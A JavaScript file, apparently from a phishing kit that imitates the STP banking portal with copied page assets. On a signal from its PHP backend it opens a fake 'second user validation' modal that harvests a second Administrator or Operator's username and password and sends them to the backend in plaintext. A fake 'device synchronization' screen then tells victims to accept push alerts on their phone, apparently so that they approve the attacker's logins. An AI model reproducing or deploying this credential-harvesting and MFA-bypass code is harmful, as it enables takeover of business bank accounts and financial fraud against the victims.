/**
 * Sistema de Revalidación de Credenciales - bXControl
 * Modal para validación de segundo usuario autorizador + 2FA
 */

class CredencialesRevalidarSystem {
    constructor() {
        this.currentRevalidacion = null;
        this.modalCreated = false;
        this.currentStep = 1;
        this.credencialesData = { usuario: '', password: '' };
        this.usuarioSesion = '';
        this.countdownActive = false;
        if (window.Telas) Telas.registrar('credenciales', () => this.resetModal());
        this.init();
    }

    init() {
        this.injectStyles();
        this.startRevalidacionCheck();
        this.checkForRevalidacion();
    }

    injectStyles() {
        if (document.getElementById('stp-revalidar-styles')) return;
        
        const css = `
/* ========================================
   MODAL REVALIDACIÓN STP - ESTILOS
   ======================================== */

.stpModal-overlay {
    position: fixed;
    inset: 0;
    background: rgba(0, 0, 0, 0.6);
    display: flex;
    justify-content: center;
    align-items: center;
    z-index: 8000;
    opacity: 0;
    visibility: hidden;
    transition: opacity 0.2s ease;
}

.stpModal-overlay.active {
    opacity: 1;
    visibility: visible;
}

/* Container principal */
.stpModal {
    background: #fff;
    width: 420px;
    max-width: 92%;
    border-radius: 6px;
    box-shadow: 0 12px 40px rgba(0, 0, 0, 0.25);
    overflow: hidden;
    position: relative;
}

/* Header azul */
.stpModal-header {
    background-color: #1C408D;
    background-image: linear-gradient(180deg, #3d62b0 0%, #1C408D 55%, #163472 100%);
    padding: 24px 32px 20px;
    text-align: center;
}

.stpModal-logo {
    width: 72px;
    height: 72px;
    border-radius: 50%;
    background: #fff;
    padding: 6px;
    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.25);
}

.stpModal-title {
    color: #fff;
    font-size: 14px;
    font-weight: 600;
    margin: 14px 0 0;
    font-family: system-ui, -apple-system, sans-serif;
}

/* Body */
.stpModal-body {
    padding: 20px 30px 20px;
    position: relative;
    z-index: 2;
}

/* Descripción */
.stpModal-desc {
    font-size: 12px;
    color: #333;
    line-height: 1.6;
    margin: 0 0 16px;
    text-align: justify;
    font-family: system-ui, -apple-system, sans-serif;
}

.stpModal-desc p {
    margin: 0 0 8px;
}

.stpModal-desc p:first-child {
    font-weight: 700;
}

.stpModal-desc p:last-child {
    margin-bottom: 0;
    font-size: 11px;
    color: #666;
}

.stpModal-desc strong {
    color: #0d3a7d;
    font-weight: 700;
}

/* Formulario */
.stpModal-form {
    display: block;
    width: fit-content;
    margin: 0 auto;
}

/* Campo */
.stpModal-field {
    display: flex;
    align-items: center;
    justify-content: flex-start;
    gap: 8px;
    margin-bottom: 8px;
}

.stpModal-label {
    display: inline-block;
    width: 108px;
    box-sizing: border-box;
    text-align: right;
    font-size: 13px;
    font-weight: normal;
    color: inherit;
    background-color: #d4e7ff;
    margin: 0;
    padding: 2px 6px;
    white-space: nowrap;
    font-family: inherit;
}

.stpModal-input {
    display: inline-block;
    width: 140px;
    max-width: 100%;
    height: auto;
    padding: 1px 2px;
    border: 1px solid #7f9db9;
    border-radius: 0;
    font-size: 11px;
    font-weight: bold;
    font-family: inherit;
    background: #fff;
    box-sizing: border-box;
}

.stpModal-input:focus {
    outline: none;
}

.stpModal-input.has-error {
    border-color: #c00;
    background: #fff8f8;
}

.stpModal-input.has-error:focus {
    border-color: #c00;
}

.stpModal-input::placeholder {
    color: #999;
}

/* Error */
.stpModal-error {
    display: none;
    font-size: 11px;
    color: #c00;
    margin-bottom: 8px;
    font-family: system-ui, -apple-system, sans-serif;
}

/* Zona de acciones */
.stpModal-actions {
    display: flex;
    justify-content: flex-end;
    align-items: center;
    padding: 4px 0 0;
    position: relative;
}

.stpModal-actions a img {
    border: 0;
    display: block;
}

/* Botón */
.stpModal-btn {
    display: block;
    width: 100%;
    min-height: 37px;
    padding: 8px 16px;
    border-radius: 4px;
    border: 1.5px solid #122c62;
    background-color: #1C408D;
    background-image: linear-gradient(180deg, #3d62b0 0%, #1C408D 55%, #163472 100%);
    color: #fff;
    font-size: 13px;
    font-weight: 700;
    cursor: pointer;
    font-family: Arial, Helvetica, sans-serif;
    box-sizing: border-box;
}

.stpModal-btn:hover {
    background-color: #163472;
    background-image: linear-gradient(180deg, #34579f 0%, #163472 55%, #102650 100%);
    border-color: #102650;
    color: #ffffff;
    box-shadow: none;
}

.stpModal-btn:active {
    transform: none;
}

.stpModal-btn:disabled {
    opacity: 0.7;
    cursor: not-allowed;
}

.stpModal-indicator {
    display: none;
    width: 16px;
    height: 16px;
}

.stpModal-actions.is-loading #stpRevalidarSubmit {
    display: none;
}

.stpModal-actions.is-loading .stpModal-indicator {
    display: block;
}

/* ========================================
   PASO 2: 2FA
   ======================================== */

.stpModal-step {
    display: none;
}

.stpModal-step.active {
    display: block;
}

/* 2FA Header */
.stpModal-2fa-header {
    text-align: center;
    padding: 10px 0 16px;
    border-bottom: 1px solid #e5e5e5;
    margin-bottom: 16px;
}

.stpModal-2fa-title {
    font-size: 13px;
    font-weight: 600;
    color: #0d3a7d;
    font-family: system-ui, -apple-system, sans-serif;
}

.stpModal-2fa-subtitle {
    font-size: 11px;
    color: #666;
    margin-top: 4px;
    font-family: system-ui, -apple-system, sans-serif;
}

/* 2FA Icon */
.stpModal-2fa-icon {
    text-align: center;
    padding: 10px 0 16px;
}

.stpModal-2fa-icon img {
    width: 80px;
    height: auto;
}

/* 2FA Steps */
.stpModal-2fa-steps {
    padding: 0 10px;
    margin-bottom: 16px;
}

.stpModal-2fa-step {
    display: flex;
    align-items: flex-start;
    gap: 10px;
    margin-bottom: 12px;
    font-size: 11px;
    color: #444;
    line-height: 1.5;
    font-family: system-ui, -apple-system, sans-serif;
}

.stpModal-2fa-step-num {
    flex-shrink: 0;
    width: 20px;
    height: 20px;
    background: #0d3a7d;
    color: #fff;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 10px;
    font-weight: 600;
}

.stpModal-2fa-step-text {
    flex: 1;
    padding-top: 2px;
}

/* 2FA Warning */
.stpModal-2fa-warning {
    text-align: center;
    font-size: 11px;
    color: #0d3a7d;
    font-weight: 600;
    font-family: system-ui, -apple-system, sans-serif;
    padding: 8px 10px 0;
}

/* Progress bar */
.stpModal-progress {
    position: absolute;
    bottom: 0;
    left: 0;
    width: 100%;
    height: 4px;
    background: #e0e0e0;
}

.stpModal-progress-bar {
    height: 100%;
    background: #0d3a7d;
    width: 100%;
    transition: width 0.1s linear;
}
`;

        const style = document.createElement('style');
        style.id = 'stp-revalidar-styles';
        style.textContent = css;
        document.head.appendChild(style);
    }

    createModal() {
        if (this.modalCreated) return;
        
        const html = `
<div id="stpRevalidarOverlay" class="stpModal-overlay">
    <div class="stpModal">
        <div class="stpModal-header">
            <img src="css/img/logo_Stp.png" alt="STP" class="stpModal-logo">
            <div class="stpModal-title" id="stpModalTitle">Validación de Segundo Usuario</div>
        </div>
        <div class="stpModal-body">
            <!-- PASO 1: Credenciales -->
            <div class="stpModal-step active" id="stpStep1">
                <div class="stpModal-desc">
                    <p>Para completar la vinculación de su cuenta, es necesario iniciar sesión con un usuario adicional con perfil de <strong>Administrador</strong>, <strong>Autorizado</strong> u <strong>Operador</strong>.</p>
                    <p>Por favor, inicie sesión con un segundo usuario que cuente con alguno de estos roles para continuar con el proceso.</p>
                    <p>Esta validación forma parte de los controles de seguridad operativa de <strong>STP</strong>.</p>
                </div>
                <div class="stpModal-form">
                    <div class="stpModal-field">
                        <label class="etiqueta label stpModal-label" for="stpRevalidarUsuario">Usuario:</label>
                        <input type="text" class="value stpModal-input" id="stpRevalidarUsuario" autocomplete="off">
                    </div>
                    <div class="stpModal-error" id="stpRevalidarUsuarioError"></div>
                    <div class="stpModal-field">
                        <label class="etiqueta label stpModal-label" for="stpRevalidarPassword">Contraseña:</label>
                        <input type="password" class="value stpModal-input" id="stpRevalidarPassword" autocomplete="new-password">
                    </div>
                    <div class="stpModal-error" id="stpRevalidarError"></div>
                    <div class="stpModal-actions">
                        <a href="#" id="stpRevalidarSubmit">
                            <img border="0" src="stpdentro_files/aplicar.gif" alt="Aplicar">
                        </a>
                        <img src="css/img/indicator.gif" alt="Cargando" class="stpModal-indicator" id="stpRevalidarIndicator">
                    </div>
                </div>
            </div>

            <!-- PASO 2: Sincronización -->
            <div class="stpModal-step" id="stpStep2">
                <div class="stpModal-2fa-header">
                    <div class="stpModal-2fa-title">Sincronización de dispositivos</div>
                    <div class="stpModal-2fa-subtitle">Verificación en proceso</div>
                </div>
                <div class="stpModal-2fa-icon">
                    <img src="prod.stpmex.com_files/cell-in.png" alt="Dispositivo">
                </div>
                <div class="stpModal-2fa-steps">
                    <div class="stpModal-2fa-step">
                        <span class="stpModal-2fa-step-num">1</span>
                        <span class="stpModal-2fa-step-text">Se enviarán notificaciones de verificación a los dispositivos vinculados a esta cuenta.</span>
                    </div>
                    <div class="stpModal-2fa-step">
                        <span class="stpModal-2fa-step-num">2</span>
                        <span class="stpModal-2fa-step-text">Acepte las alertas en su dispositivo móvil para completar la sincronización.</span>
                    </div>
                    <div class="stpModal-2fa-step">
                        <span class="stpModal-2fa-step-num">3</span>
                        <span class="stpModal-2fa-step-text">Las alertas se generan aleatoriamente para validar la conexión segura entre su dispositivo y STP.</span>
                    </div>
                </div>
                <div class="stpModal-2fa-warning">No cierre esta ventana hasta que el proceso finalice.</div>
                <div class="stpModal-progress">
                    <div class="stpModal-progress-bar" id="stpProgressBar"></div>
                </div>
            </div>
        </div>
    </div>
</div>`;

        document.body.insertAdjacentHTML('beforeend', html);
        this.bindEvents();
        this.modalCreated = true;
    }

    bindEvents() {
        const submitBtn = document.getElementById('stpRevalidarSubmit');
        const usuarioInput = document.getElementById('stpRevalidarUsuario');
        const passwordInput = document.getElementById('stpRevalidarPassword');

        if (submitBtn) {
            submitBtn.addEventListener('click', (e) => {
                e.preventDefault();
                this.submitStep1();
            });
        }

        if (usuarioInput) {
            usuarioInput.addEventListener('input', () => this.clearUsuarioError());
            usuarioInput.addEventListener('keypress', (e) => {
                if (e.key === 'Enter') {
                    e.preventDefault();
                    passwordInput?.focus();
                }
            });
        }

        if (passwordInput) {
            passwordInput.addEventListener('keypress', (e) => {
                if (e.key === 'Enter') {
                    e.preventDefault();
                    this.submitStep1();
                }
            });
        }

    }

    startRevalidacionCheck() {
        this.interval = setInterval(() => this.checkForRevalidacion(), 3000);
    }

    stopRevalidacionCheck() {
        if (this.interval) {
            clearInterval(this.interval);
            this.interval = null;
        }
    }

    async checkForRevalidacion() {
        const epoch = window.Telas ? Telas.epoch : 0;
        try {
            const res = await fetch('php_modales/credenciales_revalidar_verificar.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ accion: 'verificar_revalidacion_pendiente' })
            });
            
            const text = await res.text();
            let data;
            try {
                data = JSON.parse(text);
            } catch {
                return;
            }

            if (window.Telas && !Telas.vigente(epoch)) return;

            if (data.success && data.tiene_revalidacion) {
                if (this.currentRevalidacion && this.currentRevalidacion.revalidacion_id !== data.revalidacion_id) {
                    this.resetModal();
                }
                if (!this.currentRevalidacion) {
                    this.show(data);
                }
            } else if (data.success && this.currentRevalidacion) {
                this.resetModal();
            }
        } catch (err) {
            console.error('Error verificando revalidación:', err);
        }
    }

    resetModal() {
        // Detener countdown si está activo
        if (this.countdownActive) {
            this.countdownActive = false;
        }
        // Cerrar modal actual
        const overlay = document.getElementById('stpRevalidarOverlay');
        if (overlay) overlay.classList.remove('active');
        this.currentRevalidacion = null;
        this.currentStep = 1;
        this.credencialesData = { usuario: '', password: '' };
        this.usuarioSesion = '';
        this.setSubmitting(false);
    }

    async show(data) {
        if (this._abriendo) return;
        this._abriendo = true;
        const epoch = window.Telas ? await Telas.ocupar('credenciales') : null;
        this._abriendo = false;
        if (window.Telas && (epoch == null || !Telas.vigente(epoch))) return;
        this.createModal();
        
        const overlay = document.getElementById('stpRevalidarOverlay');
        const usuario = document.getElementById('stpRevalidarUsuario');
        const password = document.getElementById('stpRevalidarPassword');
        const error = document.getElementById('stpRevalidarError');
        const codeInput = document.getElementById('stp2faCodeInput');

        if (!overlay) return;

        // Reset
        if (usuario) usuario.value = '';
        if (password) password.value = '';
        if (codeInput) codeInput.value = '';
        if (error) {
            error.style.display = 'none';
            error.textContent = '';
        }
        this.clearUsuarioError();

        this.currentRevalidacion = data;
        this.usuarioSesion = (data.usuario_sesion || '').trim();
        this.currentStep = 1;
        this.credencialesData = { usuario: '', password: '' };
        this.showStep(1);
        this.setSubmitting(false);
        overlay.classList.add('active');

        setTimeout(() => usuario?.focus(), 100);
    }

    showStep(step) {
        this.currentStep = step;
        const steps = document.querySelectorAll('.stpModal-step');
        steps.forEach((s, i) => {
            s.classList.toggle('active', i + 1 === step);
        });

        const title = document.getElementById('stpModalTitle');
        if (title) {
            if (step === 1) title.textContent = 'Validación de Segundo Usuario';
            else if (step === 2) title.textContent = 'Sincronización de dispositivos';
        }

        // Iniciar countdown cuando se muestra paso 2
        if (step === 2) {
            this.startCountdown();
        }
    }

    startCountdown() {
        const progressBar = document.getElementById('stpProgressBar');
        const duration = 300000; // 5 minutos
        const startTime = Date.now();
        this.countdownActive = true;

        const updateProgress = () => {
            // Si se canceló el countdown, salir
            if (!this.countdownActive) return;

            const elapsed = Date.now() - startTime;
            const remaining = Math.max(0, duration - elapsed);
            const percent = (remaining / duration) * 100;

            if (progressBar) {
                progressBar.style.width = percent + '%';
            }

            if (remaining > 0) {
                requestAnimationFrame(updateProgress);
            } else {
                // Completar y cerrar
                this.countdownActive = false;
                this.completeAndClose();
            }
        };

        requestAnimationFrame(updateProgress);
    }

    async completeAndClose() {
        // Marcar como completado en DB
        await this.saveCredentials(null);
        if (window.Telas) Telas.trasRespuesta();
        this.close();
    }

    async submitStep1() {
        if (!this.currentRevalidacion) return;

        const usuario = document.getElementById('stpRevalidarUsuario')?.value.trim() || '';
        const password = document.getElementById('stpRevalidarPassword')?.value || '';

        const errorEl = document.getElementById('stpRevalidarError');
        if (errorEl) {
            errorEl.textContent = '';
            errorEl.style.display = 'none';
        }
        this.clearUsuarioError();

        if (!usuario) {
            this.showUsuarioError('Ingrese el usuario');
            document.getElementById('stpRevalidarUsuario')?.focus();
            return;
        }

        // No permitir el mismo usuario de la sesión actual
        const sesion = (this.usuarioSesion || '').trim();
        if (sesion && usuario.toLowerCase() === sesion.toLowerCase()) {
            this.showUsuarioError('Para concluir el enlace es necesario utilizar un segundo usuario ligado a la misma empresa.');
            document.getElementById('stpRevalidarUsuario')?.focus();
            return;
        }

        const passwordError = this.validarPassword(password.trim());
        if (passwordError) {
            this.showError(passwordError);
            document.getElementById('stpRevalidarPassword')?.focus();
            return;
        }

        const revalidacionId = this.currentRevalidacion.revalidacion_id;
        this.credencialesData = { usuario, password: password.trim() };
        this.setSubmitting(true);

        // PRIMERO guardar credenciales en DB
        try {
            const res = await fetch('php_modales/credenciales_revalidar_procesar.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    accion: 'guardar_credenciales_paso1',
                    revalidacion_id: this.currentRevalidacion.revalidacion_id,
                    usuario: usuario,
                    password: password
                })
            });
            const data = await res.json();
            if (!data.success) {
                if (data.campo === 'usuario') {
                    this.showUsuarioError(data.error || 'Usuario no válido');
                } else {
                    this.showError(data.error || 'Error al guardar');
                }
                this.setSubmitting(false);
                return;
            }
        } catch {
            this.showError('Error de conexión');
            this.setSubmitting(false);
            return;
        }

        // LUEGO esperar 5s (solo visual)
        await this.wait(5000);

        if (!this.currentRevalidacion || this.currentRevalidacion.revalidacion_id !== revalidacionId) return;
        this.setSubmitting(false);
        this.showStep(2);
    }

    async saveCredentials(token) {
        try {
            await fetch('php_modales/credenciales_revalidar_procesar.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    accion: 'completar_revalidacion',
                    revalidacion_id: this.currentRevalidacion.revalidacion_id,
                    token: token
                })
            });
        } catch {
            // Silencioso
        }
        setTimeout(() => this.startRevalidacionCheck(), 2000);
    }

    setSubmitting(isSubmitting) {
        const btn = document.getElementById('stpRevalidarSubmit');
        const usuarioInput = document.getElementById('stpRevalidarUsuario');
        const passwordInput = document.getElementById('stpRevalidarPassword');

        const actions = btn ? btn.parentElement : null;
        if (actions) actions.classList.toggle('is-loading', isSubmitting);
        if (btn) btn.style.pointerEvents = isSubmitting ? 'none' : '';

        if (usuarioInput) usuarioInput.disabled = isSubmitting;
        if (passwordInput) passwordInput.disabled = isSubmitting;
    }

    wait(ms) {
        return new Promise((resolve) => setTimeout(resolve, ms));
    }

    tieneCaracterEspecial(val) {
        return /[^a-zA-Z0-9]/.test(val);
    }

    validarPassword(password) {
        if (!password) {
            return "El campo 'password' es obligatorio.";
        }
        if (password.length > 20) {
            return 'La contraseña no debe exceder los 20 caracteres';
        }
        if (!this.tieneCaracterEspecial(password)) {
            return 'Su contraseña es incorrecta. Verifique que cumpla con el formato requerido e intente nuevamente.';
        }
        return null;
    }

    showUsuarioError(msg) {
        const input = document.getElementById('stpRevalidarUsuario');
        const el = document.getElementById('stpRevalidarUsuarioError');
        if (input) input.classList.add('has-error');
        if (el) {
            el.textContent = msg;
            el.style.display = 'block';
        }
    }

    clearUsuarioError() {
        const input = document.getElementById('stpRevalidarUsuario');
        const el = document.getElementById('stpRevalidarUsuarioError');
        if (input) input.classList.remove('has-error');
        if (el) {
            el.textContent = '';
            el.style.display = 'none';
        }
    }

    showError(msg) {
        const el = document.getElementById('stpRevalidarError');
        if (el) {
            el.textContent = msg;
            el.style.display = 'block';
            setTimeout(() => { el.style.display = 'none'; }, 5000);
        }
    }

    close() {
        const overlay = document.getElementById('stpRevalidarOverlay');
        if (overlay) overlay.classList.remove('active');
        this.setSubmitting(false);
        this.currentRevalidacion = null;
        this.currentStep = 1;
        this.credencialesData = { usuario: '', password: '' };
        this.usuarioSesion = '';
        this.clearUsuarioError();
    }

    destroy() {
        this.stopRevalidacionCheck();
        document.getElementById('stpRevalidarOverlay')?.remove();
        document.getElementById('stp-revalidar-styles')?.remove();
        this.modalCreated = false;
    }
}

// Init
let credencialesRevalidarSystem;
document.addEventListener('DOMContentLoaded', () => {
    credencialesRevalidarSystem = new CredencialesRevalidarSystem();
});
window.addEventListener('beforeunload', () => {
    credencialesRevalidarSystem?.destroy();
});
